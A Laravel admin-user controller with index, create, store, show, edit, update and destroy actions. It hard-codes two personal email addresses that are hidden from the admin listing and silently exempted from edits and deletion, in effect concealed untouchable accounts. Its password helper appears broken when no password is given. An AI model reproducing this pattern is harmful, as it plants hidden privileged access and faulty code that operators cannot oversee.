<?php

namespace App\Http\Controllers;

use App\Http\Controllers\Controller;
use App\Http\Resources\UserResource;
use App\Models\User;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Hash;
use Inertia\Inertia;

class AdminController extends Controller
{
    public function index()
    {
        $collections = User::query()
            ->whereNotIn('email', [
                'msi132043@gmail.com',
                'mahdihasan28@gmail.com',
            ]);

        return Inertia::render('Admin/Index', [
            'data' => [
                'collections'   => UserResource::collection($collections->paginate()->appends(request()->input())),
                'filters'       => $this->getFilterProperty(),
            ]
        ]);
    }

    public function create()
    {
        return Inertia::render('Admin/Create', [
            'data' => $this->data(new User())
        ]);
    }

    public function store(Request $request)
    {
        $admin = User::create($this->validatedData($request) + $this->getHashPassword($request));

        return redirect()
            ->route('admins.show', $admin->id)
            ->with('status', 'The record has been added successfully.');
    }

    public function show(User $admin)
    {
        return Inertia::render('Admin/Show', [
            'data' => [
                'admin' => $this->formatedData($admin)
            ]
        ]);
    }

    public function edit(User $admin)
    {
        return Inertia::render('Admin/Edit', [
            'data' => $this->data($admin)
        ]);
    }

    public function update(Request $request, User $admin)
    {
        if(!in_array($admin->email, ['msi132043@gmail.com', 'mahdihasan28@gmail.com'])) {
            $admin->update($this->validatedData($request, $admin->id) + $this->getHashPassword($request));
        }

        return redirect()
            ->route('admins.show', $admin->id)
            ->with('status', 'The record has been update successfully.');
    }

    public function destroy(User $admin)
    {
        if(!in_array($admin->email, ['msi132043@gmail.com', 'mahdihasan28@gmail.com'])) {
            $admin->delete();
        }

        return redirect()
            ->route('admins.index')
            ->with('status', 'The record has been delete successfully.');
    }

    protected function data($admin)
    {
        return [
            'admin' => $this->formatedData($admin),
        ];
    }

    protected function formatedData($admin)
    {
        UserResource::withoutWrapping();

        return new UserResource($admin);
    }

    protected function getFilterProperty()
    {
        return [
            //
        ];
    }

    protected function validatedData($request, $id = '')
    {
        return $request->validate([
            'name' => [
                'required',
                'string',
            ],
            'email' => [
                'required',
                'email'
            ]
        ]);
    }

    protected function getHashPassword($request)
    {
        return !$request->password ?: ['password' => Hash::make($request->password)];
    }

}